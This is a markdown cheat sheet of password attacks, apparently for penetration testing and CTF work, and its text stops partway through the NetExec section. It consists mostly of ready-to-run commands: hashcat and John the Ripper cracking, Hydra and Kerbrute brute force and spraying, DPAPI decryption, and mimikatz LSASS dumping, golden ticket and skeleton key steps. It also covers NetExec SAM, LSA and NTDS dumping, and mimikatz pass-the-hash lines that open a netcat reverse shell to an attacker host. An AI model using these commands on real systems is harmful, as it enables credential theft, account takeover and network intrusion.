# Password Attacks

- [Resources](#resources)

## Table of Contents

- [AES](#aes)
- [bkcrack](#bkcrack)
- [Data Protection API (DPAPI)](#data-protection-api-dpapi)
- [DonPAPI](#donpapi)
- [fcrack](#fcrack)
- [Group Policy Preferences (GPP)](#group-policy-preferences-gpp)
- [Hash-Buster](#hash-buster)
- [hashcat](#hashcat)
- [Hydra](#hydra)
- [John the Ripper](#john-the-ripper)
- [Kerbrute](#kerbrute)
- [LaZagne](#lazagne)
- [LUKS](#luks)
- [Medusa](#medusa)
- [mimikatz](#mimikatz)
- [MultiDump](#multidump)
- [NetExec](#netexec)
- [Patator](#patator)
- [PDFCrack](#pdfcrack)
- [psk-crack](#psk-crack)
- [pypykatz](#pypykatz)
- [RsaCtfTool](#rsactftool)
- [Spray-Passwords](#spray-passwords)
- [SprayingToolkit](#sprayingtoolkit)
- [VNC Password Recovery](#vnc-password-recovery)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| BetterSafetyKatz | Fork of SafetyKatz that dynamically fetches the latest pre-compiled release of Mimikatz directly from gentilkiwi GitHub repo, runtime patches signatures and uses SharpSploit DInvoke to PE-Load into memory. | https://github.com/Flangvik/BetterSafetyKatz |
| bkcrack | Crack legacy zip encryption with Biham and Kocher's known plaintext attack. | https://github.com/kimci86/bkcrack |
| CrackMapExec | CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks. | https://github.com/byt3bl33d3r/CrackMapExec |
| CredMaster | Refactored & improved CredKing password spraying tool, uses FireProx APIs to rotate IP addresses, stay anonymous, and beat throttling | https://github.com/knavesec/CredMaster |
| Default Credentials Cheat Sheet | One place for all the default credentials to assist the pentesters during an engagement, this document has a several products default credentials that are gathered from several sources. | https://github.com/ihebski/DefaultCreds-cheat-sheet |
| DeHashed | Breach Database | https://dehashed.com |
| DonPAPI | Dumping DPAPI credz remotely | https://github.com/login-securite/DonPAPI |
| DomainPasswordSpray | DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. BE VERY CAREFUL NOT TO LOCKOUT ACCOUNTS! | https://github.com/dafthack/DomainPasswordSpray |
| Firefox Decrypt | Firefox Decrypt is a tool to extract passwords from Mozilla (Firefox™, Waterfox™, Thunderbird®, SeaMonkey®) profiles | https://github.com/unode/firefox_decrypt |
| go-mimikatz | A wrapper around a pre-compiled version of the Mimikatz executable for the purpose of anti-virus evasion. | https://github.com/vyrus001/go-mimikatz |
| hashcat | Password Cracking | https://hashcat.net/hashcat |
| Hob0Rules | Password cracking rules for Hashcat based on statistics and industry patterns | https://github.com/praetorian-inc/Hob0Rules |
| Hydra | Password Brute Force | https://github.com/vanhauser-thc/thc-hydra |
| John the Ripper | Password Cracking | https://github.com/openwall/john |
| keepass-dump-masterkey | Script to retrieve the master password of a keepass database <= 2.53.1 | https://github.com/CMEPW/keepass-dump-masterkey |
| keepass4brute | Bruteforce Keepass databases (KDBX 4.x format) | https://github.com/r3nt0n/keepass4brute |
| KeePwn | A python tool to automate KeePass discovery and secret extraction. | https://github.com/Orange-Cyberdefense/KeePwn |
| Kerbrute | A tool to quickly bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication. | https://github.com/ropnop/kerbrute |
| LaZagne | The LaZagne project is an open source application used to retrieve lots of passwords stored on a local computer. | https://github.com/AlessandroZ/LaZagne |
| mimikatz | Extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. | https://github.com/gentilkiwi/mimikatz |
| MultiDump | MultiDump is a post-exploitation tool for dumping and extracting LSASS memory discreetly. | https://github.com/Xre0uS/MultiDump |
| NetExec | The Network Execution Tool | https://github.com/Pennyw0rth/NetExec |
| NPK | A mostly-serverless distributed hash cracking platform | https://github.com/c6fc/npk |
| ntlm.pw | This website offers a NTLM to plaintext password "cracking" service, using a custom high performance database with billions of precomputed password hashes. | https://ntlm.pw |
| Patator | Password Brute Force | https://github.com/lanjelot/patator |
| pypykatz | Mimikatz implementation in pure Python. | https://github.com/skelsec/pypykatz |
| RsaCtfTool | RSA multi attacks tool : uncipher data from weak public key and try to recover private key Automatic selection of best attack for the given public key. | https://github.com/Ganapati/RsaCtfTool |
| SharpChromium | .NET 4.0 CLR Project to retrieve Chromium data, such as cookies, history and saved logins. | https://github.com/djhohnstein/SharpChromium |
| Snusbase | Breach Database | https://www.snusbase.com |
| SprayingToolkit | A set of Python scripts/utilities that tries to make password spraying attacks against Lync/S4B & OWA a lot quicker, less painful and more efficient. | https://github.com/byt3bl33d3r/SprayingToolkit |
| TheSprayer | TheSprayer is a cross-platform tool designed to help penetration testers spray passwords against an Active Directory domain without locking out accounts. | https://github.com/coj337/TheSprayer |
| traceback.sh | Harness Latest Breach and Real-time Data and Advanced Investigation tools with Traceback. | https://traceback.sh |
| TREVORspray | TREVORspray is a modular password sprayer with threading, clever proxying, loot modules, and more! | https://github.com/blacklanternsecurity/TREVORspray |

## AES

### Cracking AES Encryption

#### Create AES File

```console
aes-256-ctr
aes-128-ofb
aes-192-ofb
aes-256-ofb
aes-128-ecb
aes-192-ecb
aes-256-ecb
```

#### Create String File

```console
Tq+CWzQS0wYzs2rJ+GNrPLP6qekDbwze6fIeRRwBK2WXHOhba7WR2OGNUFKoAvyW7njTCMlQzlwIRdJvaP2iYQ==
```

#### For Loop

```console
$ for i in `cat aes`; do cat string | openssl enc -d -$i -K 214125442A472D4B6150645367566B59 -iv 0 -nopad -nosalt -base64; done
```

## bkcrack

### Cracking .zip File

```console
$ ./bkcrack -L <FILE>.zip
```

```console
$ cat plaintext.txt
Secret:HTB{
```

```console
$ ./bkcrack -c tmp/fd734d942c6f729a36606b16a3ef17f8/<FILE>.txt -C <FILE>.zip -p plaintext.txt
```

## Data Protection API (DPAPI)

> https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords

> https://www.synacktiv.com/en/publications/windows-secrets-extraction-a-summary

### List Vault

```cmd
C:\> vaultcmd /listcreds:"Windows Credentials" /all
```

```console
mimikatz vault::list
```

### Credential Files

```cmd
C:\> dir /a:h C:\Users\<USERNAME>\AppData\Local\Microsoft\Credentials\
C:\> dir /a:h C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Credentials\
PS C:\> Get-ChildItem -Hidden C:\Users\<USERNAME>\AppData\Local\Microsoft\Credentials\
PS C:\> Get-ChildItem -Hidden C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Credentials\
```

```cmd
PS C:\> Get-ChildItem C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Protect\
PS C:\> Get-ChildItem C:\Users\<USERNAME>\AppData\Local\Microsoft\Protect
PS C:\> Get-ChildItem -Hidden C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Protect\
PS C:\> Get-ChildItem -Hidden C:\Users\<USERNAME>\AppData\Local\Microsoft\Protect\
PS C:\> Get-ChildItem -Hidden C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Protect\{SID}
PS C:\> Get-ChildItem -Hidden C:\Users\<USERNAME>\AppData\Local\Microsoft\Protect\{SID}
```

### Get Masterkey

```console
$ impacket-dpapi masterkey -file 99cf31a4-a552-4cf7-a8d7-aca2d6f7339b -password <PASSWORD> -sid S-1-5-21-4024337825-2033395866-2055507597-1115
```

### Decrypt Data

```console
$ impacket-dpapi credential -file C4BB96844A5C9DD43D5B6A9759252BA6 -key 0xf8901b3125dd10208da9f66562df2e68e89a48cd0278b48a47f510df01418e68b253c61707f3935662243d81c0d352f1bc8055523bf65b2d763191ecd44e525a
```

## DonPAPI

> https://github.com/login-securite/DonPAPI

```console
$ DonPAPI <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST>
$ DonPAPI -local_auth <USERNAME>@<RHOST>
$ DonPAPI --hashes <LM>:<NT> <DOMAIN>/<USERNAME>@<RHOST>
$ DonPAPI -laps <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST>
```

## fcrack

```console
$ fcrackzip -u -D -p /PATH/TO/WORDLIST/<WORDLIST> <FILE>.zip
```

## Group Policy Preferences (GPP)

### gpp-decrypt

> https://github.com/t0thkr1s/gpp-decrypt

```console
$ python3 gpp-decrypt.py -f Groups.xml
$ python3 gpp-decrypt.py -c edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

## Hash-Buster

> https://github.com/s0md3v/Hash-Buster

```console
$ buster -s 2b6d315337f18617ba18922c0b9597ff
```

## hashcat

> https://hashcat.net/hashcat/

> https://hashcat.net/wiki/doku.php?id=hashcat

> https://hashcat.net/cap2hashcat/

> https://hashcat.net/wiki/doku.php?id=example_hashes

### Common Commands

```console
$ hashcat -m 0 md5 /PATH/TO/WORDLIST/<WORDLIST>
$ hashcat -m 100 sha-1 /PATH/TO/WORDLIST/<WORDLIST>
$ hashcat -m 1400 sha256 /PATH/TO/WORDLIST/<WORDLIST>
$ hashcat -m 3200 bcrypt /PATH/TO/WORDLIST/<WORDLIST>
$ hashcat -m 900 md4 /PATH/TO/WORDLIST/<WORDLIST>
$ hashcat -m 1000 ntlm /PATH/TO/WORDLIST/<WORDLIST>
$ hashcat -m 1800 sha512 /PATH/TO/WORDLIST/<WORDLIST>
$ hashcat -m 160 hmac-sha1 /PATH/TO/WORDLIST/<WORDLIST>
$ hashcat -a 0 -m 0 <FILE> /PATH/TO/WORDLIST/<WORDLIST> -O --force
$ hashcat -O -m 500 -a 3 -1 ?l -2 ?d -3 ?u  --force hash.txt ?3?3?1?1?1?1?2?3
```

### Hash Example Search

```console
$ hashcat --example-hashes
$ hashcat --help | grep -i "ntlm"
```

### Identify Hashes

```console
$ hashcat --identify --user <FILE>
```

### Hash Rules

```console
/usr/share/wordlists/fasttrack.txt
/usr/share/hashcat/rules/best64.rule
```

### Custom Rules

> https://hashcat.net/wiki/doku.php?id=rule_based_attack

#### Add a 1 to each Password

```console
$ echo \$1 > <FILE>.rule
```

#### Capitalize first character

```console
$1
c
```

#### Add nothing, a 1 or a ! to an existing Wordlist

```console
:
$1
$!
```

#### Rule for upper case Letter, numerical Value and special Character

- $1 > appends a "1"
- $2 > appends a "2"
- $3 > appends a "3"
- c > Capitalize the first character and lower case the rest

```console
$1 c $!
$2 c $!
$1 $2 $3 c $!
```

#### Rule Preview

```console
$ hashcat -r <FILE>.rule --stdout <FILE>.txt
```

### Mask File Example

> https://hashcat.net/wiki/doku.php?id=mask_attack

#### example.hcmask

```
FOOBAR?d?d?d?d
FOOBAR?d?d?d?u
FOOBAR?d?d?u?u
FOOBAR?d?u?u?u
FOOBAR?u?u?u?u
```

### Cracking ASPREPRoast Password File

```console
$ hashcat -m 18200 -a 0 <FILE> <FILE>
```

### Cracking Kerberoasting Password File

```console
$ hashcat -m 13100 --force <FILE> <FILE>
```

### Cracking Gitea Hashes

> https://0xdf.gitlab.io/2024/12/14/htb-compiled.html#crack-gitea-hash

```console
$ sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes
```

```console
$ hashcat gitea.hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --user
```

### Bruteforce based on the Pattern

```console
$ hashcat -a3 -m0 mantas?d?d?d?u?u?u --force --potfile-disable --stdout
```

### Generate Password Candidates: Wordlist + Pattern

```console
$ hashcat -a6 -m0 "e99a18c428cb38d5f260853678922e03" yourPassword|/PATH/TO/WORDLIST/<WORDLIST> ?d?d?d?u?u?u --force --potfile-disable --stdout
```

### Generate NetNLTMv2 with internalMonologue and crack with hashcat

```console
$ InternalMonologue.exe -Downgrade False -Restore False -Impersonate True -Verbose False -challange 002233445566778888800
```

### Result

```console
spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000
```

### Crack with hashcat

```console
$ hashcat -m5600 'spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000' -a 3 /PATH/TO/WORDLIST/<WORDLIST> --force --potfile-disable
```

### Rules

> https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule

#### Cracking with OneRuleToRuleThemAll.rule

```console
$ hashcat -m 3200 hash.txt -r /PATH/TO/FILE/<FILE>.rule
```

## Hydra

> https://github.com/vanhauser-thc/thc-hydra

### Common Commands

```console
$ hydra <RHOST> -l <USERNAME> -p <PASSWORD> <PROTOCOL>
$ hydra <RHOST> -L /PATH/TO/WORDLIST/<FILE> -P /PATH/TO/WORDLIST/<FILE> <PROTOCOL>
$ hydra <RHOST> -C /PATH/TO/WORDLIST/<FILE> ftp
```

### Proxy

```console
$ export HYDRA_PROXY=connect://127.0.0.1:8080
$ unset HYDRA_PROXY
```

### SSH

```console
$ hydra <RHOST> -L usernames.txt -P passwords.txt ssh -V
$ hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> ssh -t 4
```

### FTP

```console
$ hydra <RHOST> -L usernames.txt -P passwords.txt ftp -V -f
```

### SMB

```console
$ hydra <RHOST> -L usernames.txt -P passwords.txt smb -V -f
```

### MySQL

```console
$ hydra <RHOST> -L usernames.txt -P passwords.txt mysql -V -f
```

### Postgres

```console
$ hydra <RHOST> -L usernames.txt -P passwords.txt postgres -V
```

### Telnet

```console
$ hydra <RHOST> -L usernames.txt -P passwords.txt telnet -V
```

### VNC

```console
$ hydra <RHOST> -P passwords.txt vnc -V
```

### Docker Registry

```console
$ hydra <RHOST> -L usernames.txt  -P passwords.txt -s 5000 https-get /v2/
```

### Webform

```console
$ hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"
$ hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> http-post-form "/index.php:username=user&password=^PASS^:Login failed. Invalid"
$ hydra <RHOST> -L /PATH/TO/WORDLIST/<FILE> -P /PATH/TO/WORDLIST/<FILE> http-post-form "/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s <RPORT>
$ hydra <RHOST> -l root@localhost -P otrs-cewl.txt http-form-post "/otrs/index.pl:Action=Login&RequestedURL=Action=Admin&User=root@localhost&Password=^PASS^:Login failed" -vV -f
$ hydra <RHOST> -l admin -P /PATH/TO/WORDLIST/<FILE> http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=COOKIE_1&__EVENTVALIDATION=COOKIE_2&UserName=^USER^&Password=^PASS^&LoginButton=Log+in:Login failed"
```

## John the Ripper

> https://github.com/openwall/john

```console
$ john md5 --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=raw-md5
$ john sha-1 --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=raw-sha1
$ john sha256 --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=raw-sha256
$ john bcrypt --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=bcrypt
$ john md4 --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=md4
$ john ntlm --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=nt
$ john sha512 --wordlist=/PATH/TO/WORDLIST/<WORDLIST>
```

### Show cracked Password

```console
$ john --show <FILE>
```

### Using Salt

```console
$ john <FILE> --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=raw-md5 --mask='<SALT>?w'
```

### Cracking .zip-Files

```console
$ zip2john <FILE> > <FILE>
```

### Cracking EncFS/6

```console
$ encfs2john <DIRECTORY>/ > encfs6.xml.john
$ john encfs6.xml.john --wordlist=/PATH/TO/WORDLIST/<WORDLIST>
```

### Cracking Kerberoasting Password File

```console
$ john --format=krb5tgs --wordlist=<FILE> <FILE>
```

### Cracking RSA

```console
$ ssh2john id_rsa > <FILE>
$ john <FILE> --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=ssh
```

### Cracking yescrypt

```console
$ john <FILE> --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=crypt
```

### Extracting Hash from .kdbx File

```console
$ keepass2john <FILE>
```

## Kerbrute

> https://github.com/ropnop/kerbrute

### User Enumeration

```console
$ ./kerbrute userenum -d <DOMAIN> --dc <DOMAIN> /PATH/TO/FILE/<USERNAMES>
```

### Password Spray

```console
$ ./kerbrute passwordspray -d <DOMAIN> --dc <DOMAIN> /PATH/TO/FILE/<USERNAMES> <PASSWORD>
```

## LaZagne

> https://github.com/AlessandroZ/LaZagne

```cmd
C:\> laZagne.exe all
```

## LUKS

### Extracting LUKS Header

```console
$ dd if=backup.img of=header.luks bs=512 count=4097
```

## Medusa

```console
$ medusa -h <RHOST> -U usernames.txt -P wordlist.txt -M smbnt
```

## mimikatz

> https://github.com/gentilkiwi/mimikatz

### Common Commands

```console
mimikatz # token::elevate
mimikatz # token::revert
mimikatz # vault::cred
mimikatz # vault::list
mimikatz # lsadump::sam
mimikatz # lsadump::secrets
mimikatz # lsadump::cache
mimikatz # lsadump::dcsync /<USERNAME>:<DOMAIN>\krbtgt /domain:<DOMAIN>
```

### Execute mimikatz Inline

This is helpful when executing within a `Evil-WinRM` session.

```cmd
C:\> mimikatz.exe "sekurlsa::logonpasswords" "exit"
```

### Dump Hashes

```cmd
C:\> .\mimikatz.exe
mimikatz # sekurlsa::minidump /users/admin/Desktop/lsass.DMP
mimikatz # sekurlsa::LogonPasswords
meterpreter > getprivs
meterpreter > creds_all
meterpreter > golden_ticket_create
```

### Overpass-the-hash / Pass-the-Key

```console
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

#### RC4

```console
mimikatz # sekurlsa::pth /user:Administrator /domain:<DOMAIN> /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"C:\nc64.exe -e cmd.exe <LHOST> <LPORT>"
```

#### AES128

```console
mimikatz # sekurlsa::pth /user:Administrator /domain:<DOMAIN> /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"C:\nc64.exe -e cmd.exe <LHOST> <LPORT>"
```

#### AES256

```console
mimikatz # sekurlsa::pth /user:Administrator /domain:<DOMAIN> /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"C:\nc64.exe -e cmd.exe <LHOST> <LPORT>"
```

### Pass the Ticket

```cmd
C:\> .\mimikatz.exe
mimikatz # sekurlsa::tickets /export
mimikatz # kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-<RHOST>.LOCAL.kirbi
C:\> klist
C:\> dir \\<RHOST>\admin$
```

### Forging Golden Ticket

```cmd
C:\> .\mimikatz.exe
mimikatz # privilege::debug
mimikatz # lsadump::lsa /inject /name:krbtgt
mimikatz # kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500
mimikatz # misc::cmd
C:\> klist
C:\> dir \\<RHOST>\admin$
```

### Skeleton Key

```cmd
C:\> .\mimikatz.exe
mimikatz # privilege::debug
mimikatz # misc::skeleton
C:\> net use C:\\<RHOST>\admin$ /user:Administrator mimikatz
C:\> dir \\<RHOST>\c$ /user:<USERNAME> mimikatz
```

### Data Protection API (DPAPI) Decryption

> https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials

#### rpc

```console
mimikatz # dpapi::masterkey /in:"%appdata%\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb" /rpc
```

```console
mimikatz # dpapi::cache
```

```console
mimikatz # dpapi::cred /in:"C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4"
```

## MultiDump

> https://github.com/Xre0uS/MultiDump

```console
$ python3 MultiDumpHandler.py -r <LPORT>
```

```cmd
PS C:\> .\MultiDump.exe --procdump -r <LHOST>:<LPORT>
```

## NetExec

> https://github.com/Pennyw0rth/NetExec

> https://www.netexec.wiki/

### Installation

```console
$ sudo apt-get install netexec
```

or

```console
$ sudo apt-get install pipx git
$ pipx ensurepath
$ pipx install git+https://github.com/Pennyw0rth/NetExec
```

### Installation via Poetry

```console
$ sudo apt-get install -y libssl-dev libffi-dev python-dev-is-python3 build-essential
$ git clone https://github.com/Pennyw0rth/NetExec
$ cd NetExec
$ poetry install
$ poetry run NetExec
```

### Modules

```console
$ netexec smb -L
$ netexec ldap -L
$ netexec winrm -L
$ netexec mssql -L
$ netexec ssh -L
$ netexec ftp -L
$ netexec rdp -L
$ netexec wmi -L
$ netexec nfs -L
$ netexec vnc -L
```

### Authentication

```console
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>'
$ netexec smb <RHOST> -u '<USERNAME>' -H '<HASH>'
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>'
$ netexec ldap <RHOST> -u '<USERNAME>' -H '<HASH>'
$ netexec winrm <RHOST> -u '<USERNAME>' -p '<PASSWORD>'
$ netexec winrm -u /t -p '<PASSWORD>' -d '<DOMAIN>' <RHOST>
$ netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>'
$ netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN>
$ netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth
$ netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --port <RPORT>
$ netexec wmi <RHOST> -u '<USERNAME>' -p '<PASSWORD>'
$ netexec wmi <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN>
$ netexec wmi <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth
```

#### Null Session

```console
$ netexec smb <RHOST> -u '' -p ''
$ netexec smb <RHOST> -u ' ' -p ' '
```

#### Guest Account

```console
$ netexec smb <RHOST> -u 'Guest' -p ''
```

#### Local Authenitcation

```console
$ netexec smb <RHOST> -u '<USERNAME>' --local-auth
```

#### Kerberos

##### Kerberos Authentication

```console
$ netexec smb <RHOST> -u '<USERNAME>' --use-kcache
```

##### Generate TGT

```console
$ netexec smb <RHOST> -u <USERNAME> -p <PASSWORD> --generate-tgt /PATH/TO/FILE/<FILE>.ccache
$ export KRB5CCNAME=<FILE>.ccache
$ netexec smb <RHOST> -u <USERNAME> -k --use-kcache
```

##### Generate krb5.conf

```console
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --generate-krb5-file /tmp/krb5conf2
$ export KRB5_CONFIG=/tmp/krb5conf2
$ echo '<PASSWORD>' | kinit <USERNAME>@<DOMAIN>
$ klist
```

### Bypassing LAPS

```console
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --laps
$ netexec winrm <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --laps
```

### Password Spraying

```console
$ netexec <PROTOCOL> <RHOST> -u <USERNAME> <USERNAME> <USERNAME> -p <PASSWORD>
$ netexec <PROTOCOL> <RHOST> -u <USERNAME> <USERNAME> <USERNAME> -p <PASSWORD> --ignore-pw-decoding
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --continue-on-success
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --no-bruteforce
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --no-bruteforce --continue-on-success
```

### SMB Protocol

#### SMB Share Enumeration

```console
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>'  --shares
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>'  --shares --dir
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>'  --shares --dir "<FOLDER>"
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>'  --shares --smb-timeout 10
```

#### Download Files

```console
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares -M spider_plus
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares -M spider_plus -o READ_ONLY=false
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares -M spider_plus -o DOWNLOAD_FLAG=true
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=99999999
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --share <SHARE> --get-file <FILE> <FILE>
```

#### File Handling

```console
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --get-file \\PATH\\TO\FOLDER\\<FILE> /PATH/TO/FOLDER/<FILE> 
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --put-file /PATH/TO/FILE/<FILE> \\PATH\\TO\FOLDER\\<FILE>
```

#### RID Brute Force

```console
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares --rid-brute
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares --rid-brute 100000
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares --rid-brute | grep 'SidTypeUser' | awk '{print $6}'
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares --rid-brute | grep 'SidTypeUser' | awk '{print $6}'  | awk -F '\\' '{print $2}'
```

#### Vulnerability Scanning

```console
$ netexec smb <RHOST> -u '' -p '' -M ms17-010
$ netexec smb <RHOST> -u '' -p '' -M smbghost
$ netexec smb <RHOST> -u '' -p '' -M zerologon
$ netexec smb <RHOST> -u '' -p '' -M printnightmare
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M nopac
$ netexec smb <RHOST> -u '' -p '' -M coerce_plus
$ netexec smb <RHOST> -u '' -p '' -M coerce_plus -o LISTENER=<LHOST>
$ netexec smb <RHOST> -u '' -p '' -M coerce_plus -o LISTENER=<LHOST> ALWAYS=true
$ netexec smb <RHOST> -u '' -p '' -M coerce_plus -o METHOD=PetitPotam
```

#### System Enumeration

```console
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --users
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --users-export <FILE>
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --groups
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-group
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --pass-pol
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --disks
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --interfaces
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --smb-sessions
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --loggedon-users
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M powershell_history
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M bitlocker
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M enum_av
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M spooler
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M webdav
```

#### Enumerate Hosts with SMB Signing not required

```console
$ netexec smb <SUBNET> --gen-relay-list <FILE>
```

#### Credentials Dumping

```console
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --sam
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --lsa
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dpapi
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dpapi cookies
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dpapi nosystem
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --dpapi nosystem
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ntds
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --sccm
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --sccm disk
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --sccm wmi
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M eventlog_creds
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_autologin
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_password
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M lsassy
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M nanodump
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M ntdsutil
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M ntdsutil
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M backup_operator
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M wam
